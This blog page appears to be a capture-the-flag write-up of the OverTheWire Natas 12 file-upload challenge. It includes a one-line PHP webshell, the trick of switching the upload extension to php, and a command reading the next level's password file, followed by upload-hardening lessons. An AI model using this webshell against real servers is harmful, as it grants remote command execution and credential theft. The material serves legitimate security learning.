<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="OWicca"><meta name=generator content="Hugo 0.121.2"><title>OTW Natas12 — Down the wabbit's hole</title>
<meta name=description content><link rel=canonical href=https://www.dinudev.com/journey/otw_natas12/><link href rel=alternate type=application/rss+xml title="Down the wabbit's hole"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Arvo:400,700"><link rel=stylesheet href=https://www.dinudev.com/css/highlight.css><link rel=stylesheet href=https://www.dinudev.com/css/paperback.css><link rel=stylesheet href=https://www.dinudev.com/css/main.css><link rel=stylesheet href=https://www.dinudev.com/css/tabs.css></head><body><div class=container><header><h1>OTW Natas12</h1><nav class=site-nav><a href=/>Home</a>
<a href=/post/>All posts</a>
<a href=/thoughts/>Thoughts</a>
<a href=/paper/>Papers</a></nav></header><h3>Table of Contents</h3><aside><nav id=TableOfContents><ul><li><ul><li><a href=#steps>steps:</a></li><li><a href=#lessons>lessons:</a></li></ul></li></ul></nav></aside><article><h3 id=steps>steps:</h3><ol><li>we once again get access to the source code</li><li>the source has a bunch of logic but the only usefull one is the big if/else at the end and <code>makeRandomPathFromFilename</code></li><li>in the if at the end a filepath is generated starting from the file input value,<br>the file uploaded is checked to be bellow a certain size,<br>if the check passes the uploaded file is copied in the generated filepath.<br><code>makeRandomPathFromFilename</code> takes a dir and a filename as input,<br>extracts the extension from the filename,<br>and returns a filepath that is not used on disk.</li><li>the first thing to notice is the fact that the extension of the filename is under the client&rsquo;s control,
secondly that there are not file type checks, only file size checks,<br>hinting to the possibility of generating a webshell <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</li><li>Generating the webshell:<ul><li>create a php script <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> that receives the commands through <code>q</code> param</li><li>modify <code>filename</code> input value from <code>jpg</code> to <code>php</code></li><li>upload the script</li><li>access the script from the generated link in page</li></ul></li><li>by adding <code>?q=id</code> you can check the php user</li><li>by percent encoding(needed so the value can be passed through the url) <code>cat /etc/natas_webpass/natas13</code> as <code>cat%20/etc/natas_webpass/natas13</code> and
use as value to <code>q</code> we get the flag</li></ol><h3 id=lessons>lessons:</h3><ul><li>properly check the user file input:<ul><li>size boundaries</li><li>map the name</li><li>mime type</li></ul></li><li>webserver:<ul><li>define clearly the static folders and the code dirs</li><li>only serve files from the static dirs</li><li>only run scripts from the code dirs</li></ul></li></ul><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>A webshell is a script that acts as a backdoor on the vulnerable server,<br>it is a web(because is accessible by http) shell(because we can run shell commands on it).&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p>Script contents</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>passthru</span>($_REQUEST[<span style=color:#e6db74>&#34;q&#34;</span>]);
</span></span></code></pre></div>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></li></ol></div></article><nav class=site-nav><a href=https://www.dinudev.com//>Home</a>
<a href=https://www.dinudev.com//post/>All posts</a>
<a href=https://www.dinudev.com//thoughts/>Thoughts</a>
<a href=https://www.dinudev.com//paper/>Papers</a>
<a href=https://github.com/Owicca>GitHub</a></nav><footer class=site-footer><span class=owner>©2024 OWicca</span></footer></div><script src=https://www.dinudev.com/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad()</script><script src=https://www.dinudev.com/js/tabs.js></script></body></html>